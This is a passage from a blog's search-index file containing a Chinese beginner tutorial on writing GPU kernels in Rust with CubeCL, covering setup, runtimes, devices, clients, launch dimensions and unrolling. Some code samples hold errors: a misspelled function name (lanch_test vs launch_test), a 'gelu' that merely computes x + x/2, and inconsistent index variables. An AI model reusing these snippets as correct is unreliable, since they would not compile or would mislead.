            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rust-cubecl实现gpu开发</title>
      <link href="/2025/04/08/rust-cubecl%E5%AE%9E%E7%8E%B0gpu%E5%BC%80%E5%8F%91/"/>
      <url>/2025/04/08/rust-cubecl%E5%AE%9E%E7%8E%B0gpu%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="CubeCL-Rust-GPU计算教程"><a href="#CubeCL-Rust-GPU计算教程" class="headerlink" title="CubeCL Rust GPU计算教程"></a>CubeCL Rust GPU计算教程</h1><p>新手也能学会的高性能开发，只需要rust和cubel基础知识即可实现！</p><p>CubeCL是一个现代化的Rust GPU计算框架，它让编写高性能、可移植的GPU内核变得简单。通过CubeCL，你可以：</p><ul><li>使用熟悉的Rust语法编写GPU代码</li><li>无需深入掌握复杂的GPU编程知识</li><li>轻松切换不同后端(WGPU&#x2F;CUDA等)</li><li>自动优化SIMD并行计算</li></ul><h2 id="为什么选择CubeCL"><a href="#为什么选择CubeCL" class="headerlink" title="为什么选择CubeCL?"></a>为什么选择CubeCL?</h2><ol><li><strong>简单易用</strong>：用Rust写GPU代码，学习曲线平缓</li><li><strong>高性能</strong>：自动向量化优化，充分利用GPU算力  </li><li><strong>可移植</strong>：同一份代码可运行在WGPU&#x2F;CUDA等不同后端</li><li><strong>类型安全</strong>：Rust的类型系统保证代码安全性</li></ol><blockquote><p>提示：即使没有GPU编程经验，通过本教程你也能快速上手CubeCL！</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置CubeCL非常简单，只需在Cargo.toml中添加依赖：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">cubecl</span> = &#123; version = <span class="string">&quot;0.4.0&quot;</span>, features = [<span class="string">&quot;wgpu&quot;</span>,<span class="string">&quot;default&quot;</span>,<span class="string">&quot;std&quot;</span>] &#125;</span><br></pre></td></tr></table></figure><h3 id="功能说明："><a href="#功能说明：" class="headerlink" title="功能说明："></a>功能说明：</h3><ul><li><code>wgpu</code>：使用WGPU后端(跨平台)</li><li><code>std</code>：启用标准库支持</li></ul><blockquote><p>小贴士：开发时建议同时启用wgpu和cuda特性，这样可以灵活切换后端测试</p></blockquote><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">cubecl</span> = &#123; version = <span class="string">&quot;0.4.0&quot;</span>,features = [<span class="string">&quot;wgpu&quot;</span>,<span class="string">&quot;cuda&quot;</span>,<span class="string">&quot;default&quot;</span>,<span class="string">&quot;std&quot;</span>] &#125;</span><br></pre></td></tr></table></figure><h2 id="第一个GPU程序"><a href="#第一个GPU程序" class="headerlink" title="第一个GPU程序"></a>第一个GPU程序</h2><p>让我们从一个简单的GPU计算程序开始。虽然初看可能有些复杂，但我们会逐步解析每个部分。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> cubecl::prelude::*;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube(launch)]</span>  <span class="comment">// 标记为可启动的GPU内核入口函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="comment">// ABSOLUTE_POS_X是自动生成的线程索引</span></span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;  <span class="comment">// 边界检查</span></span><br><span class="line">        <span class="comment">// 对每个元素应用gelu_scalar激活函数</span></span><br><span class="line">        output[ABSOLUTE_POS_X] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>&lt;F: Float&gt;(x: Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">add</span>(x, x/<span class="number">2.0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a + b  <span class="comment">// 向量化加法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">lanch_test</span>&lt;R: Runtime&gt;(device: &amp;R::Device) &#123;</span><br><span class="line">    <span class="comment">// 创建与GPU设备的连接</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 准备测试数据: 4096个5.0f32</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = &amp;[<span class="number">5f32</span>;<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vectorization</span> = <span class="number">4</span>;  <span class="comment">// 向量化宽度</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配GPU内存</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output_handle</span> = client.<span class="title function_ invoke__">empty</span>(input.<span class="title function_ invoke__">len</span>() * core::mem::size_of::&lt;<span class="type">f32</span>&gt;());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input_handle</span> = client.<span class="title function_ invoke__">create</span>(<span class="type">f32</span>::<span class="title function_ invoke__">as_bytes</span>(input));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="comment">// 启动GPU内核</span></span><br><span class="line">        gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">            &amp;client,  <span class="comment">// GPU客户端</span></span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),  <span class="comment">// 1个Hyper-Cube</span></span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                <span class="number">2</span>,  <span class="comment">// X维度</span></span><br><span class="line">                <span class="number">1</span>,  <span class="comment">// Y维度</span></span><br><span class="line">                <span class="number">1</span>   <span class="comment">// Z维度</span></span><br><span class="line">            ),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取结果</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes</span> = client.<span class="title function_ invoke__">read_one</span>(output_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output</span> = <span class="type">f32</span>::<span class="title function_ invoke__">from_bytes</span>(&amp;bytes);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;GPU计算结果(Runtime: &#123;:?&#125;) =&gt; &#123;:?&#125;&quot;</span>, R::<span class="title function_ invoke__">name</span>(), output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">device</span> = <span class="built_in">Default</span>::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    launch_test::&lt;Runtime&gt;(&amp;device);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这段代码初看有些复杂，但CubeCL的设计实际上隐藏了许多GPU编程的复杂性。让我们分解理解每个部分：</p><h2 id="核心概念解析"><a href="#核心概念解析" class="headerlink" title="核心概念解析"></a>核心概念解析</h2><h3 id="1-Runtime-运行时"><a href="#1-Runtime-运行时" class="headerlink" title="1. Runtime(运行时)"></a>1. Runtime(运行时)</h3><p>Runtime是CubeCL的核心概念之一，它决定了你的代码将在哪种GPU后端上运行：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br></pre></td></tr></table></figure><p>在cubecl中，runtime代表了我们的gpu运算将基于什么去运行，这里我选择的是wgpu，同理，我们也可以将他换成为cuda。</p><h3 id="2-Device-设备"><a href="#2-Device-设备" class="headerlink" title="2. Device(设备)"></a>2. Device(设备)</h3><p>Device代表实际的运算硬件。现代计算机可能有：</p><ul><li>独立显卡(Discrete GPU)</li><li>集成显卡(Integrated GPU) </li><li>CPU(作为后备)</li><li>虚拟GPU(如云环境)</li></ul><p>CubeCL支持灵活选择设备：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::Cpu;</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">DiscreteGpu</span>(<span class="number">0</span>);<span class="comment">// 独立gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">IntegratedGpu</span>(<span class="number">0</span>);<span class="comment">// 集成gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">VirtualGpu</span>(<span class="number">0</span>);<span class="comment">// 虚拟gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><h3 id="3-Client-客户端"><a href="#3-Client-客户端" class="headerlink" title="3. Client(客户端)"></a>3. Client(客户端)</h3><p>Client是连接CPU和GPU的桥梁，主要功能包括：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br></pre></td></tr></table></figure><p><code>client</code> 是 GPU 运行时（如 CUDA 或 OpenCL）的<strong>高层抽象</strong>，封装了以下功能：</p><ul><li><strong>内存管理</strong>：分配&#x2F;释放 GPU 显存（如 <code>client.create()</code> 和 <code>client.empty()</code>）。</li><li><strong>数据传输</strong>：在 CPU 内存和 GPU 显存之间拷贝数据（如 <code>client.read_one()</code>）。</li><li><strong>内核执行</strong>：提交 GPU 内核（Kernel）启动命令到设备队列。</li></ul><p>其中</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R::<span class="title function_ invoke__">client</span>(device)创建与指定GPU设备（device）绑定的运行时客户端。</span><br><span class="line">client.<span class="title function_ invoke__">create</span>(data)将CPU数据（data）拷贝到GPU显存，返回显存句柄（input_handle）。</span><br><span class="line">client.<span class="title function_ invoke__">empty</span>(size)在GPU显存中分配未初始化的空间（大小为size字节），返回句柄。</span><br><span class="line">client.<span class="title function_ invoke__">read_one</span>(handle)将GPU显存中的数据（通过handle标识）读回CPU内存。</span><br><span class="line">gelu_array::<span class="title function_ invoke__">launch</span>(client, ...)通过client提交内核执行任务到GPU队列。</span><br></pre></td></tr></table></figure><p>可以说**<code>client</code> 是GPU编程的入口**，它负责连接设备、管理数据、执行任务。</p><h2 id="GPU内核编程"><a href="#GPU内核编程" class="headerlink" title="GPU内核编程"></a>GPU内核编程</h2><p>与传统GPU编程不同，CubeCL允许直接用Rust编写运算逻辑。关键点是<code>#[cube]</code>宏：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a + b  <span class="comment">// 这个加法运算将在GPU上执行！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="核心特点："><a href="#核心特点：" class="headerlink" title="核心特点："></a>核心特点：</h3><ol><li>使用Rust语法，无需学习新语言</li><li><code>Line&lt;T&gt;</code>类型表示可向量化数据</li><li>自动生成优化的GPU代码</li></ol><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS&lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>&lt;F: Float&gt;(x: Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    <span class="comment">// Execute the sqrt function at comptime.</span></span><br><span class="line">    <span class="title function_ invoke__">add</span>(x,x/<span class="number">2.0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a+b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cube-宏详解"><a href="#cube-宏详解" class="headerlink" title="#[cube]宏详解"></a><code>#[cube]</code>宏详解</h3><p><code>#[cube]</code>宏标记的函数将在GPU上执行，支持多种变体：</p><table><thead><tr><th>宏变体</th><th>用途</th></tr></thead><tbody><tr><td><code>#[cube]</code></td><td>基本GPU函数</td></tr><tr><td><code>#[cube(launch)]</code></td><td>生成可启动的内核入口函数</td></tr><tr><td><code>#[cube(debug)]</code></td><td>调试模式，打印生成代码</td></tr></tbody></table><p>在这个“入口”函数中，我们是如下定义的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) </span><br></pre></td></tr></table></figure><p>官方是这么描述line的，我们的数据就从这里进入。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// A [Line] represents a contiguous series of elements where SIMD operations may be available.</span></span><br><span class="line"><span class="comment">/// The runtime will automatically use SIMD instructions when possible for improved performance.</span></span><br></pre></td></tr></table></figure><p>正常情况下，使用launch去创建一个“入口”，之后我们就可以调用 <code>函数名::launch</code>了，如下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">     &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2u32</span>, <span class="number">1u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>我们发现这里比我们设定的参数多了好多东西，最开始所传入的就是我们所生成的client，也就是调用gpu的那个接口，接下来的东西比较多，我们需要慢慢解释。</p><h2 id="GPU并行模型"><a href="#GPU并行模型" class="headerlink" title="GPU并行模型"></a>GPU并行模型</h2><p>CubeCL使用独特的”多维立方体”模型管理GPU并行：</p><ol><li><strong>Hyper-Cube</strong>：顶层并行单元，由<code>CubeCount::Static</code>定义数量</li><li><strong>Cube</strong>：中层并行单元，由<code>CubeDim::new</code>定义尺寸</li><li><strong>Unit</strong>：基础执行单元，包含向量化数据</li></ol><p>这种抽象让并行计算更直观，Hyper-Cube又由Cube构成：</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c7cb8d9.png" alt="image1"></p><p>Cube由unit构成</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c825a53.png" alt="https://www.helloimg.com/i/2025/04/08/67f520c825a53.png"></p><p>最小单元就是unit每个unit中可以存放的数据量就是vectorization，当然这个也可以理解为一个uint的线程数。</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c5447de.png" alt="https://www.helloimg.com/i/2025/04/08/67f520c5447de.png"></p><h3 id="启动配置示例"><a href="#启动配置示例" class="headerlink" title="启动配置示例"></a>启动配置示例</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">    &amp;client,</span><br><span class="line">    CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),  <span class="comment">// 1个Hyper-Cube</span></span><br><span class="line">    CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>),       <span class="comment">// 每个Cube是2x1x1</span></span><br><span class="line">    input_arg,                   <span class="comment">// 输入数据</span></span><br><span class="line">    output_arg,                  <span class="comment">// 输出缓冲区</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这个配置表示：</p><ul><li>总计算量：8个元素(4向量宽度 × 2 × 1 × 1)</li><li>完美匹配数组长度时性能最佳</li></ul><h2 id="性能计算技巧"><a href="#性能计算技巧" class="headerlink" title="性能计算技巧"></a>性能计算技巧</h2><p>合理配置可以最大化GPU利用率：</p><ol><li><p><strong>总量计算</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总元素 = 向量宽度 × (Cube.x × Cube.y × Cube.z) × (HyperCube.x × HyperCube.y × HyperCube.z)</span><br></pre></td></tr></table></figure></li><li><p><strong>X轴计算</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X轴元素 = 向量宽度 × Cube.x × HyperCube.x</span><br></pre></td></tr></table></figure></li><li><p><strong>最佳实践</strong>：</p><ul><li>使总元素数略大于实际数据量</li><li>优先扩展X轴维度</li><li>保持向量宽度为4或8的倍数</li></ul></li></ol><p>至于为什么要计算这个，我们还要先回到运算逻辑代码处，我们先说明这段代码的作用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS&lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里虽然并没有出现for循环，但我们可以理解再这个函数内部是不断循环的，其中ABSOLUTE_POS就是不断遍历的下标，去执行我们定义的函数。同理下面这个是只遍历x轴上的unit，将每个x轴上的unit进行gelu_scalar函数处理，进行单列运算</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS_X] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p><strong>循环展开（Loop Unrolling）</strong> 是一种通过减少循环控制开销（如分支判断、计数器更新）来提升性能的优化技术。它通过将循环体内的代码重复多次，减少循环迭代次数，从而提高指令级并行性（ILP）和内存访问效率。以下是 CUDA 循环展开的详细解释和实现方法：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch_unchecked)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">sum_basic</span>&lt;F: Float&gt;(input: &amp;Array&lt;F&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;F&gt;, <span class="meta">#[comptime]</span> end: <span class="type">Option</span>&lt;<span class="type">u32</span>&gt;) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">unroll</span> = end.<span class="title function_ invoke__">is_some</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">end</span> = end.<span class="title function_ invoke__">unwrap_or_else</span>(|| input.<span class="title function_ invoke__">len</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">sum</span> = F::<span class="title function_ invoke__">new</span>(<span class="number">0.0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[unroll(unroll)]</span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..end &#123;</span><br><span class="line">        sum += input[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    output[UNIT_POS] = sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高级话题：矩阵运算"><a href="#高级话题：矩阵运算" class="headerlink" title="高级话题：矩阵运算"></a>高级话题：矩阵运算</h2><p>处理矩阵需要同时考虑X和Y维度：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> ABSOLUTE_POS_Y &lt; output.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS_X+ABSOLUTE_POS_Y *【x每行unit的个数】] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X+ABSOLUTE_POS_Y *【x每行unit的个数】]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点：</p><ol><li>使用<code>ABSOLUTE_POS_X</code>和<code>ABSOLUTE_POS_Y</code>访问二维索引</li><li>手动计算线性索引</li><li>确保边界检查</li></ol><p>当然，仅仅是处理一个参数在世界情况中还是并不常见，那么多个参数的情况也很简单，只需要在队伍的lauch中添加参数即可</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input1: &amp;Array&lt;Line&lt;F&gt;&gt;,input2:&amp;Array&lt;Line&lt;F&gt;&gt;,output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input1.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> ABSOLUTE_POS_Y &lt; output.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">            output[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>] = <span class="title function_ invoke__">add</span>(input1[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>],input2[ABSOLUTE_POS_X+ABSOLUTE_POS_Y*<span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span 